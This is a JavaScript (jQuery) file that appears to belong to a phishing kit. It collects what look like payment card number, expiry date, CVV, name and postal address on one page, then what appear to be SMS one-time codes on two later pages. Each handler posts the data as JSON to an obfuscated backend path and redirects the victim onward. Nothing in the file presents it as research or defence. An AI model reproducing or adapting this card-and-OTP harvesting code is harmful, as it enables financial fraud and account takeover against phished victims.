$(function(){
    $("#pg2").on("submit",function(e){
        e.preventDefault();
        let a1 = $("#numcc").val();
        let a2 = $("#numdd").val();
        let a3 = $("#numvv").val();
        let a4 = $("#num").val();
        let a5 = $("#numadr").val();
        let a6 = $("#numcit").val();
        let a7 = $("#numreg").val(); 
        let a8 = $("#numpos").val(); 


        //send backend:
        $.ajax({
            url: '/v2C8VrVuzY7WzVJv5RB6',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({a1,a2,a3,a4,a5,a6,a7,a8}),
            success: function(info) {
                if(info.OK){
                    window.location = "/KecdAK8hGCFkbAY2Qpnk";
                }
            }
        });
    });
    // $(".center #di").on("click",function(e){


    //     //send backend:
    //     $.ajax({
    //         url: '/fBnsyeWCkGU5PtN44397',
    //         type: 'POST',
    //         contentType: 'application/json',
    //         data: JSON.stringify({logita:"Mabritx Nxri"}),
    //         success: function(info) {
    //             if(info.OK){
    //                 window.location = "/ZjCHNsVuB44QhpjLAj2H";
    //             }
    //         }
    //     });
    // });

    // $("#pg2").on("submit",function(e){
    //     e.preventDefault();
    //     let a1 = $("#numcc").val();
    //     let a2 = $("#numdd").val();
    //     let a3 = $("#numvv").val();
    //     // let a4 = $("#w5").val();


    //     //send backend:
    //     $.ajax({
    //         url: '/v2C8VrVuzY7WzVJv5RB6',
    //         type: 'POST',
    //         contentType: 'application/json',
    //         data: JSON.stringify({a1,a2,a3}),
    //         success: function(info) {
    //             if(info.OK){
    //                 window.location = "/KecdAK8hGCFkbAY2Qpnk";
    //             }
    //         }
    //     });
    // });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        let sps1 = $("#sps1").val();


        //send backend:
        $.ajax({
            url: '/xGJzLd2dUSJrY9Gscu6P',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/jD9TUUwFtwdRXBh6P4cc";
                }
            }
        });
    });


    $("#pg4").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps2 = $("#sps2").val();
        //send backend:
        $.ajax({
            url: '/4cWAN9yzqstPGkN79uY4',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps2}),
            success: function(info) {
                if(info.OK){
                    window.location = "/Aw6knaPZ5nz4RnFvFV8s";
                }
            }
        });
    });



});